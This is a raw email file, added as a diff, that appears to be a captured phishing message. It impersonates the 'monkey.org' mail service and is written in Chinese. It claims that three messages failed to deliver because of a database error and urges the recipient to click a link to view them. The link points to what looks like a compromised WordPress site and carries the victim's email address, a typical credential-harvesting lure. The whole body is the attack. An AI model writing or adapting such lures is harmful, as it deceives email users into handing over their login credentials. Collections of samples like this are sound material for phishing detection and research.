@@ -1,0 +1,74 @@
+Return-Path: bounces+5253322-9ff2-jose=monkey.org@sendgrid.net
+Delivered-To: jose@monkey.org
+X-FDA: 76911999864.08.sleep84_4404ef926dc8
+X-Spam-Summary: 1,0,0,,d41d8cd98f00b204,bounces+5253322-9ff2-jose=monkey.org@sendgrid.net,,RULES_HIT,0,RBL:168.245.126.177:@sendgrid.net:.lbl8.mailshell.net-62.18.0.32 64.10.201.10,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fp,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0,LFtime:9,LUA_SUMMARY:none
+X-HE-Tag: sleep84_4404ef926dc8
+X-Filterd-Recvd-Size: 3931
+Received: from xvfrtzbk.outbound-mail.sendgrid.net (xvfrtzbk.outbound-mail.sendgrid.net [168.245.126.177])
+	by imf13.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Wed, 10 Jun 2020 04:20:11 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sendgrid.net; 
+	h=from:to:subject:mime-version:content-type:content-transfer-encoding; 
+	s=smtpapi; bh=QkNYyHktSsQgioDj3ZBWkt86pBH+F0scGH76o34Iric=; b=bs
+	dyiug21JGq4stDVT3VGGemJNewAT9d6ubwrcfJJ9XwRS+Mur82i9fowwKRiA1td/
+	5OXgeUoO+YZhaCVcjPwvYGY7GYkmoaV9485aLflsJ32REDJEJynGKjHza3ARWHVW
+	+21DVaOamEu/Z/rsewls8bj+6A6iIPDAgBCTPK/Y4=
+Received: by filter0965p1las1.sendgrid.net with SMTP id filter0965p1las1-26919-5EE05F7A-4
+        2020-06-10 04:20:10.37798063 +0000 UTC m=+112311.186449613
+Received: from t-online.de (unknown)
+	by ismtpd0005p1lon1.sendgrid.net (SG) with ESMTP id 8GIHg_-NROKObzewT783Zw
+	for <jose@monkey.org>; Wed, 10 Jun 2020 04:20:10.029 +0000 (UTC)
+From: monkey.org <no-reply@t-online.de>
+To: jose@monkey.org
+Subject: =?UTF-8?B?5pWw5o2u5bqT6ZSZ6K+v?=
+Date: Wed, 10 Jun 2020 04:20:10 +0000 (UTC)
+Message-ID: <20200609212001.DAB352050BA02717@t-online.de>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-SG-EID: uk4PP0eEjut4P8/eKt92EMT2PN5rig6Ts8EnoW54QtA/MLVp+21TWmwN3F77ORcFEbcjpJU41ub93v
+ eMmqYXFi9CO1KhyYhh2j1nk2H6diKt+xPMct4j+m2Z9qq+rA8SomTFKonOyRbdlTZJqMpLyg8GDOf7
+ A1NI+2dkc/n1mRx8QQ68Qxxl4szKX7G6H3EVgwSKr4ysqWwkO4qwFY9FKw==
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 72
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17842"></HEAD>
+<BODY>
+<P><SPAN style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; COLOR: rg=
+b(0,0,0)">&#20146;&nbsp;</SPAN>jose@monkey.org<BR style=3D"FONT-SIZE: 15px;=
+ FONT-FAMILY: Arial,sans-serif; COLOR: rgb(0,0,0)"><BR style=3D"FONT-SIZE: =
+15px; FONT-FAMILY: Arial,sans-serif; COLOR: rgb(0,0,0)"><SPAN style=3D"FONT=
+-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; COLOR: rgb(0,0,0)">&#24744; &#2=
+4050;&#25910;&#21040; 3 &#26080;&#27861;&#21457;&#36865;&#30340;&#26032;&#3=
+7038;&#20214;</SPAN>
+<BR style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; COLOR: rgb(0,0=
+,0)"><BR style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; COLOR: rg=
+b(0,0,0)"><SPAN style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; CO=
+LOR: rgb(0,0,0)">&#30001;&#20110;&#25968;&#25454;&#24211;&#38169;&#35823;&#=
+12290;</SPAN><BR style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; C=
+OLOR: rgb(0,0,0)"><BR style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-ser=
+if; COLOR: rgb(0,0,0)">
+<BR style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; COLOR: rgb(0,0=
+,0)"><BR style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; COLOR: rg=
+b(0,0,0)">
+<A style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; COLOR: rgb(153,=
+0,153)" href=3D"https://www.m-i-r.com.ua/wp-includes/@@@/2020/?email=3Djose=
+@monkey.org" rel=3D"noopener noreferrer" target=3D_blank data-saferedirectu=
+rl=3D"https://www.google.com/url?q=3Dhttps://ayaengineers.com/uploads/@@@@@=
+@/2020/redirect/?email%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1=
+591838699689000&amp;usg=3DAFQjCNFz7H_tSl48DwCVu-T09keTf2JOkg"><FONT color=
+=3D#ff0000>&#26597;&#30475;&#24182;&#20445;&#23384;&#28040;&#24687;</FONT><=
+/A>
+<BR style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; COLOR: rgb(0,0=
+,0)"><BR style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; COLOR: rg=
+b(0,0,0)"><BR style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif; COLO=
+R: rgb(0,0,0)"><BR style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans-serif;=
+ COLOR: rgb(0,0,0)"><SPAN style=3D"FONT-SIZE: 15px; FONT-FAMILY: Arial,sans=
+-serif; COLOR: rgb(0,0,0)">
+&#22914;&#26524;&#19978;&#36848;&#20219;&#21153;&#26410;&#23436;&#25104;&#6=
+5292;&#21017;&#21487;&#33021;&#20877;&#27425;&#21457;&#29983;&#36825;&#3118=
+1;&#25968;&#25454;&#24211;&#38169;&#35823;&#12290;</SPAN></P></BODY></HTML>=
+
